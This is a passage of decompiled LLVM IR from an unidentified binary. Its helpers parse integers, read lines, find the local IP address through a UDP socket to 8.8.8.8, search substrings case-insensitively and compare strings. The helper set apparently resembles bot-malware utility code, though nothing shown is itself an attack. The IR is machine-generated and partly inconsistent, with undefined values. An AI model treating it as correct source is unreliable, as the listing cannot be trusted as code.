  %v2_13c20 = icmp eq i32 %v0_13c20, 0
  %. = select i1 %v2_13c20, i32 87, i32 55
  %v2_13c2c = sub nsw i32 %v1_13c2c, %.
  br label %dec_label_pc_13c30

dec_label_pc_13c30:                               ; preds = %dec_label_pc_13bec, %dec_label_pc_13c20
  %v0_13c4437 = phi i32 [ %v1_13c00, %dec_label_pc_13bec ], [ %., %dec_label_pc_13c20 ]
  %v3_13c6812 = phi i32 [ %v1_13bfc, %dec_label_pc_13bec ], [ %v2_13c2c, %dec_label_pc_13c20 ]
  %v6_13c34 = icmp slt i32 %v3_13c6812, %arg2
  br i1 %v6_13c34, label %dec_label_pc_13c38, label %dec_label_pc_13c78

dec_label_pc_13c38:                               ; preds = %dec_label_pc_13c30
  %v3_13c38 = icmp uge i32 %v2_13c6811, %v2_13bdc
  %v9_13c38 = icmp eq i32 %v2_13c6811, %v2_13bdc
  %v2_13c3c = xor i1 %v3_13c38, true
  %v3_13c3c = or i1 %v9_13c38, %v2_13c3c
  br i1 %v3_13c3c, label %bb63, label %bb64

bb63:                                             ; preds = %dec_label_pc_13c38
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_13c38, %bb63
  %v0_13c4436 = phi i32 [ %v0_13c4437, %dec_label_pc_13c38 ], [ 0, %bb63 ]
  %v2_13c40 = xor i1 %v9_13c38, true
  %v3_13c40 = and i1 %v3_13c38, %v2_13c40
  br i1 %v3_13c40, label %bb65, label %bb66

bb65:                                             ; preds = %bb64
  br label %bb66

bb66:                                             ; preds = %bb64, %bb65
  %v0_13c44 = phi i32 [ %v0_13c4436, %bb64 ], [ 1, %bb65 ]
  %tmp78 = icmp slt i32 %v1_13c44, 0
  %v4_13c44 = zext i1 %tmp78 to i32
  %v5_13c44 = or i32 %v0_13c44, %v4_13c44
  %v7_13c44 = icmp eq i32 %v5_13c44, 0
  br i1 %v7_13c44, label %dec_label_pc_13c50, label %.thread8

dec_label_pc_13c50:                               ; preds = %bb66
  %v7_13c60 = icmp sgt i32 %v3_13c6812, %v2_13bcc
  br i1 %v7_13c60, label %bb69, label %.thread5

.thread5:                                         ; preds = %dec_label_pc_13c50
  br label %bb70

bb69:                                             ; preds = %dec_label_pc_13c50
  %v2_13c64 = icmp eq i1 %v9_13c38, false
  br i1 %v2_13c64, label %bb70, label %.thread8

bb70:                                             ; preds = %bb69, %.thread5
  %v4_13c6813 = mul i32 %v2_13c6811, %arg2
  %v5_13c6814 = add i32 %v3_13c6812, %v4_13c6813
  br label %.thread8

.thread8:                                         ; preds = %bb69, %bb66, %bb70
  %v1_13c8429 = phi i32 [ %v2_13c6811, %bb69 ], [ %v2_13c6811, %bb66 ], [ %v5_13c6814, %bb70 ]
  %v0_13c7827 = phi i32 [ -1, %bb69 ], [ -1, %bb66 ], [ 1, %bb70 ]
  %v1_13c70 = inttoptr i32 %v0_13c70 to i8*
  %v2_13c70 = load i8, i8* %v1_13c70, align 1
  %v5_13c70 = add i32 %v0_13c70, 1
  br label %dec_label_pc_13bec

dec_label_pc_13c78:                               ; preds = %dec_label_pc_13c30, %bb60
  %v1_13c78 = icmp slt i32 %v1_13c44, 0
  %v2_13c9c = icmp eq i32 %v0_13c9c, 0
  br i1 %v1_13c78, label %dec_label_pc_13c9c, label %dec_label_pc_13c80

dec_label_pc_13c80:                               ; preds = %dec_label_pc_13c78
  br i1 %v2_13c9c, label %bb72, label %bb71

bb71:                                             ; preds = %dec_label_pc_13c80
  %v2_13c84 = sub i32 0, %v2_13c6811
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_13c80, %bb71
  %v23_13c88 = phi i32 [ %v2_13c6811, %dec_label_pc_13c80 ], [ %v2_13c84, %bb71 ]
  ret i32 %v23_13c88

dec_label_pc_13c8c:                               ; preds = %dec_label_pc_13bac
  %v1_13c8c = inttoptr i32 %v5_13b8c to i8*
  %v2_13c8c = load i8, i8* %v1_13c8c, align 1
  %v5_13c8c = add i32 %v0_13b8c, 2
  br label %dec_label_pc_13bc4

dec_label_pc_13c9c:                               ; preds = %dec_label_pc_13c78
  %.76 = select i1 %v2_13c9c, i32 2147483647, i32 -2147483648
  ret i32 %.76

; uselistorder directives
  uselistorder i1 %v9_13c38, { 1, 0, 2 }
  uselistorder i1 %v3_13c38, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_13c08, { 1, 2, 0 }
  uselistorder i1 %v2_13c08, { 1, 0, 2 }
  uselistorder i32 %v1_13bec, { 1, 2, 0 }
  uselistorder i32 %v1_13c2c, { 1, 0, 2 }
  uselistorder i32 %v1_13c44, { 1, 0 }
  uselistorder i32 %v2_13c6811, { 0, 1, 6, 3, 2, 4, 5 }
  uselistorder i32 %v0_13c70, { 1, 0 }
  uselistorder i32 %v2_13bdc, { 1, 0, 2 }
  uselistorder i32 %storemerge1, { 1, 0 }
  uselistorder i32 %v5_13b8c, { 4, 3, 5, 2, 1, 0 }
  uselistorder i32 %v0_13b8c, { 0, 1, 3, 2 }
  uselistorder i32 25, { 24, 25, 12, 3, 0, 4, 13, 5, 14, 6, 15, 11, 16, 17, 18, 1, 19, 7, 20, 2, 21, 8, 9, 22, 10, 23, 26, 27 }
  uselistorder i32 24, { 32, 33, 35, 11, 10, 74, 41, 75, 42, 57, 36, 12, 37, 13, 38, 14, 39, 40, 60, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 61, 56, 62, 58, 59, 76, 77, 78, 63, 79, 0, 64, 15, 1, 65, 16, 17, 2, 66, 18, 67, 19, 3, 20, 21, 4, 22, 5, 23, 6, 24, 7, 68, 25, 69, 70, 71, 26, 27, 8, 72, 28, 73, 29, 80, 81, 82, 83, 84, 30, 85, 9, 34, 31, 86 }
  uselistorder i8 32, { 7, 13, 8, 9, 0, 10, 11, 12, 1, 2, 3, 4, 5, 6, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i8 9, { 6, 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
  uselistorder label %dec_label_pc_13c30, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %dec_label_pc_13bc4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13b8c, { 1, 2, 0, 3 }
}

define i32 @function_13cac(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13cac:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_13cac = load i32, i32* @r4, align 4
  store i32 %v3_13cac, i32* %stack_var_-24, align 4
  store i32 %tmp, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13cc4

dec_label_pc_13cc4:                               ; preds = %dec_label_pc_13cf0.dec_label_pc_13cc4_crit_edge, %dec_label_pc_13cac
  %v0_13cc8 = phi i32 [ %v0_13cc8.pre, %dec_label_pc_13cf0.dec_label_pc_13cc4_crit_edge ], [ %arg3, %dec_label_pc_13cac ]
  %v0_13cc4 = phi i32 [ %v1_13cdc, %dec_label_pc_13cf0.dec_label_pc_13cc4_crit_edge ], [ %tmp, %dec_label_pc_13cac ]
  %v3_13cd0 = inttoptr i32 %v0_13cc4 to i32*
  %v4_13cd0 = call i32 @read(i32 %v0_13cc8, i32* %v3_13cd0, i32 1)
  %v7_13cd4 = icmp eq i32 %v4_13cd0, 1
  %v0_13cd8 = load i32, i32* %r4.global-to-local, align 4
  %v1_13cdc = add i32 %v0_13cd8, 1
  store i32 %v1_13cdc, i32* %r4.global-to-local, align 4
  %v0_13ce4 = load i32, i32* %r5.global-to-local, align 4
  br i1 %v7_13cd4, label %dec_label_pc_13ce4, label %dec_label_pc_13cfc

dec_label_pc_13ce4:                               ; preds = %dec_label_pc_13cc4
  %v1_13ce4 = add i32 %v0_13ce4, 1
  store i32 %v1_13ce4, i32* %r5.global-to-local, align 4
  %v0_13ce8 = load i32, i32* %r7.global-to-local, align 4
  %v7_13cec = icmp sgt i32 %v0_13ce8, %v1_13ce4
  br i1 %v7_13cec, label %dec_label_pc_13cf0, label %dec_label_pc_13cfc

dec_label_pc_13cf0:                               ; preds = %dec_label_pc_13ce4
  %v1_13cf0 = inttoptr i32 %v0_13cd8 to i8*
  %v2_13cf0 = load i8, i8* %v1_13cf0, align 1
  %v7_13cf4 = icmp eq i8 %v2_13cf0, 10
  br i1 %v7_13cf4, label %dec_label_pc_13cfc, label %dec_label_pc_13cf0.dec_label_pc_13cc4_crit_edge

dec_label_pc_13cf0.dec_label_pc_13cc4_crit_edge:  ; preds = %dec_label_pc_13cf0
  %v0_13cc8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13cc4

dec_label_pc_13cfc:                               ; preds = %dec_label_pc_13cc4, %dec_label_pc_13cf0, %dec_label_pc_13ce4
  %v0_13cfc = phi i32 [ %v1_13ce4, %dec_label_pc_13cf0 ], [ %v1_13ce4, %dec_label_pc_13ce4 ], [ %v0_13ce4, %dec_label_pc_13cc4 ]
  %v2_13cfc = icmp eq i32 %v0_13cfc, 0
  %v1_13d00 = load i32, i32* %r8.global-to-local, align 4
  %storemerge = select i1 %v2_13cfc, i32 0, i32 %v1_13d00
  %v2_13d08 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_13d08, i32* @r4, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_13cdc, { 1, 0 }
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i8 10, { 7, 1, 0, 8, 9, 2, 3, 4, 5, 6 }
  uselistorder i32 (i32, i32*, i32)* @read, { 3, 1, 0, 4, 5, 2 }
  uselistorder label %dec_label_pc_13cfc, { 1, 2, 0 }
}

define i32 @function_13d0c() local_unnamed_addr {
dec_label_pc_13d0c:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 16, i32* %r4.global-to-local, align 4
  %v2_13d14 = ptrtoint i32* %stack_var_-40 to i32
  store i32 16, i32* %stack_var_-24, align 4
  %v0_13d1c = call i32* @__errno_location()
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %v0_13d1c, align 4
  %v3_13d34 = call i32 @_socket(i32 2, i32 2, i32 0)
  store i32 %v3_13d34, i32* @r0, align 4
  %v7_13d40 = icmp eq i32 %v3_13d34, -1
  store i32 %v3_13d34, i32* %r5.global-to-local, align 4
  %v2_13d4c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v2_13d14, i32* @r1, align 4
  %v0_13d58 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v7_13d40, label %dec_label_pc_13d9c, label %dec_label_pc_13d60

dec_label_pc_13d60:                               ; preds = %dec_label_pc_13d0c
  %v7_13d4c = shl i32 2056, %v2_13d4c
  %v8_13d4c = or i32 %v7_13d4c, 2056
  store i32 2, i32* %stack_var_-40, align 4
  %v3_13d7c = call i32 @_connect(i32 %v3_13d34, i32 %v2_13d14, i32 %v2_13d4c)
  %tmp13 = bitcast i32* %stack_var_-40 to %sockaddr*
  %v0_13d88 = load i32, i32* %r5.global-to-local, align 4
  %v6_13d8c = call i32 @getsockname(i32 %v0_13d88, %sockaddr* %tmp13, i32* nonnull %stack_var_-24)
  %v1_13d94 = call i32 @close(i32 %v0_13d88)
  br label %dec_label_pc_13d9c

dec_label_pc_13d9c:                               ; preds = %dec_label_pc_13d0c, %dec_label_pc_13d60
  %v0_13d9c = phi i32 [ %v0_13d58, %dec_label_pc_13d0c ], [ %v8_13d4c, %dec_label_pc_13d60 ]
  ret i32 %v0_13d9c

; uselistorder directives
  uselistorder i32 %v3_13d34, { 1, 2, 0, 3 }
  uselistorder i32 (i32)* @close, { 9, 33, 32, 8, 7, 25, 24, 6, 5, 19, 1, 0, 11, 10, 17, 16, 18, 38, 37, 31, 30, 36, 35, 4, 34, 29, 28, 27, 26, 23, 22, 21, 20, 3, 2, 15, 14, 13, 12, 39 }
  uselistorder i32 (i32, i32, i32)* @_connect, { 2, 8, 1, 6, 7, 5, 4, 3, 0 }
  uselistorder i32 2056, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @_socket, { 5, 19, 1, 4, 17, 18, 16, 15, 14, 2, 13, 12, 11, 10, 3, 9, 8, 7, 6, 0 }
  uselistorder i32* ()* @__errno_location, { 6, 0, 4, 5, 1, 3, 2, 7 }
  uselistorder label %dec_label_pc_13d9c, { 1, 0 }
}

define i32 @function_13da8(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13da8:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp20 = ptrtoint i8* %arg1 to i32
  %v3_13dac = load i8, i8* %tmp, align 1
  %v2_13db0 = icmp eq i8 %v3_13dac, 0
  br i1 %v2_13db0, label %bb, label %dec_label_pc_13dc4

bb:                                               ; preds = %dec_label_pc_13da8
  %v4_13dac = zext i8 %v3_13dac to i32
  br label %dec_label_pc_13dd8

dec_label_pc_13dc4:                               ; preds = %dec_label_pc_13da8
  br label %dec_label_pc_13dc8

dec_label_pc_13dc8:                               ; preds = %dec_label_pc_13dc8, %dec_label_pc_13dc4
  %v0_13dc8 = phi i32 [ %v1_13dc8, %dec_label_pc_13dc8 ], [ 0, %dec_label_pc_13dc4 ]
  %v1_13dc8 = add i32 %v0_13dc8, 1
  %v2_13dcc = add i32 %v1_13dc8, %arg2
  %v3_13dcc = inttoptr i32 %v2_13dcc to i8*
  %v4_13dcc = load i8, i8* %v3_13dcc, align 1
  %v2_13dd0 = icmp eq i8 %v4_13dcc, 0
  br i1 %v2_13dd0, label %dec_label_pc_13dd8, label %dec_label_pc_13dc8

dec_label_pc_13dd8:                               ; preds = %dec_label_pc_13dc8, %bb
  %v0_13e1c18 = phi i32 [ %v4_13dac, %bb ], [ %v1_13dc8, %dec_label_pc_13dc8 ]
  %v0_13de01 = load i32, i32* @r1, align 4
  %tmp27 = icmp slt i32 %v0_13de01, 1
  br i1 %tmp27, label %dec_label_pc_13e2c, label %dec_label_pc_13dec

dec_label_pc_13dec:                               ; preds = %dec_label_pc_13dd8, %dec_label_pc_13de0.backedge
  %v0_13de4.in = phi i32 [ %v0_13de4, %dec_label_pc_13de0.backedge ], [ %v0_13de01, %dec_label_pc_13dd8 ]
  %v0_13e10 = phi i32 [ %v1_13e10., %dec_label_pc_13de0.backedge ], [ 0, %dec_label_pc_13dd8 ]
  %v0_13dec = phi i32 [ %v5_13dec, %dec_label_pc_13de0.backedge ], [ %tmp20, %dec_label_pc_13dd8 ]
  %v0_13de4 = add i32 %v0_13de4.in, -1
  %v1_13dec = inttoptr i32 %v0_13dec to i8*
  %v2_13dec = load i8, i8* %v1_13dec, align 1
  %v3_13dec = zext i8 %v2_13dec to i32
  %v5_13dec = add i32 %v0_13dec, 1
  %v2_13df0 = add i32 %v0_13e10, %arg2
  %v3_13df0 = inttoptr i32 %v2_13df0 to i8*
  %v4_13df0 = load i8, i8* %v3_13df0, align 1
  %v6_13df0 = zext i8 %v4_13df0 to i32
  %v1_13df4 = add nsw i32 %v3_13dec, -65
  %v1_13df8 = add nsw i32 %v6_13df0, -65
  %tmp35 = icmp ult i32 %v1_13df4, 26
  br i1 %tmp35, label %bb28, label %bb29

bb28:                                             ; preds = %dec_label_pc_13dec
  %v5_13e00 = or i32 %v3_13dec, 96
  br label %bb29

bb29:                                             ; preds = %dec_label_pc_13dec, %bb28
  %v0_13e0c = phi i32 [ %v3_13dec, %dec_label_pc_13dec ], [ %v5_13e00, %bb28 ]
  %tmp36 = icmp ult i32 %v1_13df8, 26
  br i1 %tmp36, label %bb30, label %bb31

bb30:                                             ; preds = %bb29
  %v5_13e08 = or i32 %v6_13df0, 96
  br label %bb31

bb31:                                             ; preds = %bb29, %bb30
  %v1_13e0c = phi i32 [ %v6_13df0, %bb29 ], [ %v5_13e08, %bb30 ]
  %v9_13e0c = icmp eq i32 %v0_13e0c, %v1_13e0c
  %v1_13e10 = add i32 %v0_13e10, 1
  %v1_13e10. = select i1 %v9_13e0c, i32 %v1_13e10, i32 0
  br i1 %v9_13e0c, label %dec_label_pc_13e1c, label %dec_label_pc_13de0.backedge

dec_label_pc_13de0.backedge:                      ; preds = %bb31, %dec_label_pc_13e1c
  %tmp32 = icmp slt i32 %v0_13de4, 1
  br i1 %tmp32, label %dec_label_pc_13e2c, label %dec_label_pc_13dec

dec_label_pc_13e1c:                               ; preds = %bb31
  %v9_13e1c = icmp eq i32 %v0_13e1c18, %v1_13e10.
  br i1 %v9_13e1c, label %dec_label_pc_13e24, label %dec_label_pc_13de0.backedge

dec_label_pc_13e24:                               ; preds = %dec_label_pc_13e1c
  %v2_13e24 = sub i32 %v5_13dec, %tmp20
  ret i32 %v2_13e24

dec_label_pc_13e2c:                               ; preds = %dec_label_pc_13de0.backedge, %dec_label_pc_13dd8
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_13e10., { 1, 0 }
  uselistorder i32 %v0_13dec, { 1, 0 }
  uselistorder i32 %v0_13e10, { 1, 0 }
  uselistorder i8 %v3_13dac, { 1, 0 }
  uselistorder i32 %tmp20, { 1, 0 }
  uselistorder i32 26, { 0, 1, 2, 5, 3, 6, 4, 7, 8 }
  uselistorder i32* @r1, { 1, 40, 3, 46, 47, 6, 42, 45, 41, 10, 11, 35, 7, 8, 9, 12, 13, 14, 15, 43, 44, 0, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 37, 38, 39, 2, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 4, 5 }
  uselistorder label %dec_label_pc_13de0.backedge, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %dec_label_pc_13dec, { 1, 0 }
}

define i32 @function_13e34(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13e34:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_13e34 = load i8, i8* %arg1, align 1
  %v2_13e38 = icmp eq i8 %v2_13e34, 0
  br i1 %v2_13e38, label %bb, label %dec_label_pc_13e44

bb:                                               ; preds = %dec_label_pc_13e34
  %v3_13e34 = zext i8 %v2_13e34 to i32
  br label %dec_label_pc_13e58

dec_label_pc_13e44:                               ; preds = %dec_label_pc_13e34
  br label %dec_label_pc_13e48

dec_label_pc_13e48:                               ; preds = %dec_label_pc_13e48, %dec_label_pc_13e44
  %v0_13e48 = phi i32 [ %v1_13e48, %dec_label_pc_13e48 ], [ 0, %dec_label_pc_13e44 ]
  %v1_13e48 = add i32 %v0_13e48, 1
  %v2_13e4c = add i32 %v1_13e48, %tmp
  %v3_13e4c = inttoptr i32 %v2_13e4c to i8*
  %v4_13e4c = load i8, i8* %v3_13e4c, align 1
  %v2_13e50 = icmp eq i8 %v4_13e4c, 0
  br i1 %v2_13e50, label %dec_label_pc_13e58, label %dec_label_pc_13e48

dec_label_pc_13e58:                               ; preds = %dec_label_pc_13e48, %bb
  %v1_13e7c = phi i32 [ %v3_13e34, %bb ], [ %v1_13e48, %dec_label_pc_13e48 ]
  %v1_13e58 = inttoptr i32 %arg2 to i8*
  %v2_13e58 = load i8, i8* %v1_13e58, align 1
  %v2_13e5c = icmp eq i8 %v2_13e58, 0
  br i1 %v2_13e5c, label %bb22, label %dec_label_pc_13e68

bb22:                                             ; preds = %dec_label_pc_13e58
  %v3_13e58 = zext i8 %v2_13e58 to i32
  br label %dec_label_pc_13e7c

dec_label_pc_13e68:                               ; preds = %dec_label_pc_13e58
  br label %dec_label_pc_13e6c

dec_label_pc_13e6c:                               ; preds = %dec_label_pc_13e6c, %dec_label_pc_13e68
  %v0_13e6c = phi i32 [ %v1_13e6c, %dec_label_pc_13e6c ], [ 0, %dec_label_pc_13e68 ]
  %v1_13e6c = add i32 %v0_13e6c, 1
  %v2_13e70 = add i32 %v1_13e6c, %arg2
  %v3_13e70 = inttoptr i32 %v2_13e70 to i8*
  %v4_13e70 = load i8, i8* %v3_13e70, align 1
  %v2_13e74 = icmp eq i8 %v4_13e70, 0
  br i1 %v2_13e74, label %dec_label_pc_13e7c, label %dec_label_pc_13e6c

dec_label_pc_13e7c:                               ; preds = %dec_label_pc_13e6c, %bb22
  %v0_13ea84 = phi i32 [ %v3_13e58, %bb22 ], [ %v1_13e6c, %dec_label_pc_13e6c ]
  %v9_13e7c = icmp eq i32 %v0_13ea84, %v1_13e7c
  br i1 %v9_13e7c, label %dec_label_pc_13ea8.preheader, label %dec_label_pc_13e88

dec_label_pc_13ea8.preheader:                     ; preds = %dec_label_pc_13e7c
  %v2_13ea86 = icmp eq i32 %v1_13e7c, 0
  br i1 %v2_13ea86, label %dec_label_pc_13eb0, label %dec_label_pc_13e90

dec_label_pc_13e88:                               ; preds = %dec_label_pc_13e90, %dec_label_pc_13e7c
  ret i32 0

dec_label_pc_13e90:                               ; preds = %dec_label_pc_13ea0, %dec_label_pc_13ea8.preheader
  %v0_13ea8.in = phi i32 [ %v0_13ea8, %dec_label_pc_13ea0 ], [ %v1_13e7c, %dec_label_pc_13ea8.preheader ]
  %v0_13ea4 = phi i32 [ %v1_13ea4, %dec_label_pc_13ea0 ], [ %arg2, %dec_label_pc_13ea8.preheader ]
  %v0_13ea0 = phi i32 [ %v1_13ea0, %dec_label_pc_13ea0 ], [ %tmp, %dec_label_pc_13ea8.preheader ]
  %v0_13ea8 = add i32 %v0_13ea8.in, -1
  %v1_13e90 = inttoptr i32 %v0_13ea0 to i8*
  %v2_13e90 = load i8, i8* %v1_13e90, align 1
  %v1_13e94 = inttoptr i32 %v0_13ea4 to i8*
  %v2_13e94 = load i8, i8* %v1_13e94, align 1
  %v9_13e98 = icmp eq i8 %v2_13e90, %v2_13e94
  br i1 %v9_13e98, label %dec_label_pc_13ea0, label %dec_label_pc_13e88

dec_label_pc_13ea0:                               ; preds = %dec_label_pc_13e90
  %v1_13ea0 = add i32 %v0_13ea0, 1
  %v1_13ea4 = add i32 %v0_13ea4, 1
  %v2_13ea8 = icmp eq i32 %v0_13ea8, 0
  br i1 %v2_13ea8, label %dec_label_pc_13eb0, label %dec_label_pc_13e90

dec_label_pc_13eb0:                               ; preds = %dec_label_pc_13ea0, %dec_label_pc_13ea8.preheader
  ret i32 1

; uselistorder directives
  uselistorder i8 %v2_13e58, { 1, 0 }
  uselistorder i8 %v2_13e34, { 1, 0 }
}

define i32 @function_13eb8(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13eb8:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_13ebc = load i8, i8* %arg1, align 1
  %v2_13ec0 = icmp eq i8 %v2_13ebc, 0
  %v0_13ec4 = load i32, i32* %r2.global-to-local, align 4
  br i1 %v2_13ec0, label %bb, label %dec_label_pc_13ed0

bb:                                               ; preds = %dec_label_pc_13eb8
  %v3_13ebc = zext i8 %v2_13ebc to i32
  br label %dec_label_pc_13ee4

dec_label_pc_13ed0:                               ; preds = %dec_label_pc_13eb8
  br label %dec_label_pc_13ed4

dec_label_pc_13ed4:                               ; preds = %dec_label_pc_13ed4, %dec_label_pc_13ed0
  %v0_13ed4 = phi i32 [ %v1_13ed4, %dec_label_pc_13ed4 ], [ 0, %dec_label_pc_13ed0 ]
  %v1_13ed4 = add i32 %v0_13ed4, 1
  %v2_13ed8 = add i32 %v1_13ed4, %tmp
  %v3_13ed8 = inttoptr i32 %v2_13ed8 to i8*
  %v4_13ed8 = load i8, i8* %v3_13ed8, align 1
  %v2_13edc = icmp eq i8 %v4_13ed8, 0
  br i1 %v2_13edc, label %dec_label_pc_13ee4, label %dec_label_pc_13ed4

dec_label_pc_13ee4:                               ; preds = %dec_label_pc_13ed4, %bb
  %v9_13f0c = phi i32 [ %v3_13ebc, %bb ], [ %v1_13ed4, %dec_label_pc_13ed4 ]
  %v0_13ee4 = load i32, i32* %r1.global-to-local, align 4
  %v1_13ee4 = inttoptr i32 %v0_13ee4 to i8*
  %v2_13ee4 = load i8, i8* %v1_13ee4, align 1
  %v3_13ee4 = zext i8 %v2_13ee4 to i32
  %v2_13ee8 = icmp eq i8 %v2_13ee4, 0
  br i1 %v2_13ee8, label %bb26, label %dec_label_pc_13ef4

bb26:                                             ; preds = %dec_label_pc_13ee4
  store i32 %v3_13ee4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13f08

dec_label_pc_13ef4:                               ; preds = %dec_label_pc_13ee4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13ef8

dec_label_pc_13ef8:                               ; preds = %dec_label_pc_13ef8, %dec_label_pc_13ef4
  %v0_13ef8 = phi i32 [ %v1_13ef8, %dec_label_pc_13ef8 ], [ 0, %dec_label_pc_13ef4 ]
  %v1_13ef8 = add i32 %v0_13ef8, 1
  store i32 %v1_13ef8, i32* %r2.global-to-local, align 4
  %v2_13efc = add i32 %v1_13ef8, %v0_13ee4
  %v3_13efc = inttoptr i32 %v2_13efc to i8*
  %v4_13efc = load i8, i8* %v3_13efc, align 1
  %v2_13f00 = icmp eq i8 %v4_13efc, 0
  br i1 %v2_13f00, label %dec_label_pc_13f08, label %dec_label_pc_13ef8

dec_label_pc_13f08:                               ; preds = %dec_label_pc_13ef8, %bb26
  %v1_13f08 = phi i32 [ %v3_13ee4, %bb26 ], [ %v1_13ef8, %dec_label_pc_13ef8 ]
  %v2_13f08 = sub i32 %v0_13ec4, %v1_13f08
  %v4_13f08 = xor i32 %v1_13f08, %v0_13ec4
  %v5_13f08 = xor i32 %v2_13f08, %v0_13ec4
  %v6_13f08 = and i32 %v5_13f08, %v4_13f08
  %v7_13f0c = icmp sgt i32 %v0_13ec4, %v1_13f08
  br i1 %v7_13f0c, label %bb28, label %bb27

bb27:                                             ; preds = %dec_label_pc_13f08
  %v10_13f0c = sub i32 %v0_13ec4, %v9_13f0c
  %v12_13f0c = xor i32 %v9_13f0c, %v0_13ec4
  %v13_13f0c = xor i32 %v10_13f0c, %v0_13ec4
  %v14_13f0c = and i32 %v13_13f0c, %v12_13f0c
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_13f08, %bb27
  %v2_13f10.in = phi i32 [ %v6_13f08, %dec_label_pc_13f08 ], [ %v14_13f0c, %bb27 ]
  %v1_13f10.in = phi i32 [ %v2_13f08, %dec_label_pc_13f08 ], [ %v10_13f0c, %bb27 ]
  %v1_13f08.pn = phi i32 [ %v1_13f08, %dec_label_pc_13f08 ], [ %v9_13f0c, %bb27 ]
  %v0_13f10 = icmp eq i32 %v0_13ec4, %v1_13f08.pn
  %v1_13f10 = icmp slt i32 %v1_13f10.in, 0
  %v2_13f10 = icmp slt i32 %v2_13f10.in, 0
  %v3_13f10 = xor i1 %v2_13f10, %v1_13f10
  %v4_13f10 = or i1 %v0_13f10, %v3_13f10
  br i1 %v4_13f10, label %dec_label_pc_13f20.preheader, label %dec_label_pc_13f38

dec_label_pc_13f20.preheader:                     ; preds = %bb28
  %v2_13f205 = icmp eq i32 %v0_13ec4, 0
  br i1 %v2_13f205, label %dec_label_pc_13f40, label %dec_label_pc_13f28

dec_label_pc_13f18:                               ; preds = %dec_label_pc_13f28
  %v1_13f18 = add i32 %v0_13f18, 1
  %v1_13f1c = add i32 %v0_13f1c, 1
  store i32 %v1_13f1c, i32* %r1.global-to-local, align 4
  %v2_13f20 = icmp eq i32 %v0_13f20, 0
  br i1 %v2_13f20, label %dec_label_pc_13f40, label %dec_label_pc_13f28

dec_label_pc_13f28:                               ; preds = %dec_label_pc_13f18, %dec_label_pc_13f20.preheader
  %v0_13f20.in = phi i32 [ %v0_13f20, %dec_label_pc_13f18 ], [ %v0_13ec4, %dec_label_pc_13f20.preheader ]
  %v0_13f1c = phi i32 [ %v1_13f1c, %dec_label_pc_13f18 ], [ %v0_13ee4, %dec_label_pc_13f20.preheader ]
  %v0_13f18 = phi i32 [ %v1_13f18, %dec_label_pc_13f18 ], [ %tmp, %dec_label_pc_13f20.preheader ]
  %v0_13f20 = add i32 %v0_13f20.in, -1
  %v1_13f28 = inttoptr i32 %v0_13f18 to i8*
  %v2_13f28 = load i8, i8* %v1_13f28, align 1
  %v3_13f28 = zext i8 %v2_13f28 to i32
  store i32 %v3_13f28, i32* %r2.global-to-local, align 4
  %v1_13f2c = inttoptr i32 %v0_13f1c to i8*
  %v2_13f2c = load i8, i8* %v1_13f2c, align 1
  %v9_13f30 = icmp eq i8 %v2_13f28, %v2_13f2c
  br i1 %v9_13f30, label %dec_label_pc_13f18, label %dec_label_pc_13f38

dec_label_pc_13f38:                               ; preds = %dec_label_pc_13f28, %bb28
  ret i32 0

dec_label_pc_13f40:                               ; preds = %dec_label_pc_13f18, %dec_label_pc_13f20.preheader
  ret i32 1

; uselistorder directives
